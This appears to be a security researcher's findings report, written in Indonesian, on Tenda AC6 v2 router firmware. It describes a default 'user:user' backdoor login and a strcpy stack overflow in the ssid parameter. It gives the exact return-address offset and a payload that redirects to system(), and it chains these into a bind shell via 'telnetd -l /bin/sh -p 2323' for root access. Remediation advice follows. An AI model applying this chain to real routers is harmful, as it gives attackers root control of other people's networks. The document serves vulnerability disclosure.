# Findings — Tenda AC6 v2 (V15.03.06.51_multi)

Ringkas temuan dan bukti. Semua data sensitif diredaksi.

## 1. Target
- Perangkat: Tenda AC6 v2, SoC Realtek RTL8197F, MIPS 24Kc little-endian.
- Firmware: `V15.03.06.51_multi`.
- Layanan: HTTP admin di port 80 (tanpa HTTPS).

## 2. Backdoor account `user:user`
- Endpoint `POST /login/Auth` menerima kredensial bawaan `user` / `user` → `302` + `Set-Cookie: password=<token>`.
- Bukan `strcmp(...,"user")` literal: fungsi `getwebuserpwd` (`0x434694`) membaca config
  `sys.baseusername` & `sys.baseuserpass`, yang **default-nya** `user`/`user`.
- Admin asli: `sys.username=admin`, `sys.userpass=<md5>`.
- Bukti config (contoh, diredaksi): lihat `firmware/mib.sample.cfg`.

## 3. Stack buffer overflow → RCE
- Fungsi: `form_fast_setting_wifi_set` (`0x477c20`), param `ssid`.
- `strcpy(fp+0x50, ssid)` dan `strcpy(fp+0x90, ssid)` — **tanpa** cek panjang.
- Saved `$ra` di `fp+892` → offset `748` dari buffer kedua.
- Mitigasi: non-PIE (alamat tetap), NX off (stack executable), tanpa stack canary.
- Payload: `b'A'*748 + p32(0x005047c0)[:3]` (system) — 3 byte karena `strcpy` berhenti di NUL;
  NUL yang ditambahkan otomatis menggenapi `$ra` tanpa merusak pointer `req` di `fp+896`.

## 4. Rantai eksploit (emulasi)
```
login user:user → token → POST /goform/fast_setting_wifi_set (ssid = payload)
  → saved $ra = system()  → system("telnetd -l /bin/sh -p 2323")  → ROOT SHELL
```
Bukti: `uname -a`, `cat /etc/passwd` (`root::0:0`), `ps w` (proses `telnetd`). Shell berjalan sebagai root (UID 0).
Tangkapan layar: `docs/screenshots/`.

## 5. Celah asli vs harness emulasi
- **Asli**: overflow `strcpy` + backdoor config.
- **Harness (repo ini)**: patch hook epilog / "cave" di `bin/httpd` agar demo `$ra→system()` andal
  di QEMU. Pada perangkat asli, RCE penuh memerlukan kontrol `$a0` (ROP/ret2stack).

## 6. Rekomendasi
- Update firmware / ganti perangkat. Ganti kredensial `base` (user/user) & password WiFi.
- Matikan WPS/UPnP/cloud bila tak perlu; jangan expose admin ke WAN.
- Perbaikan kode: gunakan `strncpy`/`snprintf` (batasi panjang), dan hilangkan akun bawaan.
